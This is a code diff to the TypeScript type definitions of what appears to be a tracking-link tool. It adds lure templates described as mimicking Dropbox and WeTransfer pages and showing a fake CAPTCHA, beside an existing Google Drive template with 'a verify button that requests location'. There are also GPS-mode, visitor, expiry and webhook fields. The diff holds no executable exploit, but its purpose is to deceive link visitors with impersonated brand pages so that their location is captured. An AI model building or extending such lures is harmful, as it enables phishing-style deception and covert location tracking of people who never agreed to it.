@@ -11,6 +11,23 @@ export interface GdriveTemplateOptions {
   message?: string;
 }
 
+export interface DropboxTemplateOptions {
+  folderName?: string;
+  ownerEmail?: string;
+  message?: string;
+}
+
+export interface CaptchaTemplateOptions {
+  siteTitle?: string;
+  message?: string;
+}
+
+export interface WetransferTemplateOptions {
+  fileName?: string;
+  fileSize?: string;
+  senderEmail?: string;
+}
+
 export interface Domain {
   id: number;
   domain: string;
@@ -26,23 +43,27 @@ export interface Link {
   id: number;
   slug: string;
   targetUrl: string;
-  templateId: 'redirect' | 'gdrive';
+  templateId: 'redirect' | 'gdrive' | 'dropbox' | 'captcha' | 'wetransfer';
   title: string | null;
   templateOptions: string | null;
   gpsMode: 'required' | 'optional' | 'disabled';
   domainId: number | null;
   isActive: boolean;
   visitCount: number;
+  expiresAt: string | null;
+  maxVisits: number | null;
   createdAt: string;
 }
 
 export interface CreateLinkInput {
   targetUrl: string;
-  templateId: 'redirect' | 'gdrive';
+  templateId: 'redirect' | 'gdrive' | 'dropbox' | 'captcha' | 'wetransfer';
   title?: string;
-  templateOptions?: RedirectTemplateOptions | GdriveTemplateOptions;
+  templateOptions?: RedirectTemplateOptions | GdriveTemplateOptions | DropboxTemplateOptions | CaptchaTemplateOptions | WetransferTemplateOptions;
   gpsMode?: 'required' | 'optional' | 'disabled';
   domainId?: number;
+  expiresAt?: string | null;
+  maxVisits?: number | null;
 }
 
 export interface Visitor {
@@ -214,7 +235,26 @@ export interface Stats {
   visitorsPerDay: { date: string; count: number }[];
 }
 
-export const VALID_TEMPLATE_IDS = ['redirect', 'gdrive'] as const;
+export interface Webhook {
+  id: number;
+  url: string;
+  events: string[];
+  secret: string | null;
+  isActive: boolean;
+  createdAt: string;
+}
+
+export interface AuditLog {
+  id: number;
+  adminId: number | null;
+  action: string;
+  targetType: string | null;
+  targetId: number | null;
+  details: string | null;
+  createdAt: string;
+}
+
+export const VALID_TEMPLATE_IDS = ['redirect', 'gdrive', 'dropbox', 'captcha', 'wetransfer'] as const;
 export const VALID_GPS_MODES = ['required', 'optional', 'disabled'] as const;
 
 export type TemplateId = typeof VALID_TEMPLATE_IDS[number];
@@ -236,6 +276,21 @@ export const TEMPLATES: TemplateInfo[] = [
     id: 'gdrive',
     name: 'Google Drive',
     description: 'Mimics a Google Drive file page with a verify button that requests location',
+  },
+  {
+    id: 'dropbox',
+    name: 'Dropbox',
+    description: 'Mimics a Dropbox shared folder invitation with a verify button',
+  },
+  {
+    id: 'captcha',
+    name: 'CAPTCHA',
+    description: 'Shows a "Verify you are human" page with a fake CAPTCHA checkbox',
+  },
+  {
+    id: 'wetransfer',
+    name: 'WeTransfer',
+    description: 'Mimics a WeTransfer download page with a download button',
   },
 ];
 
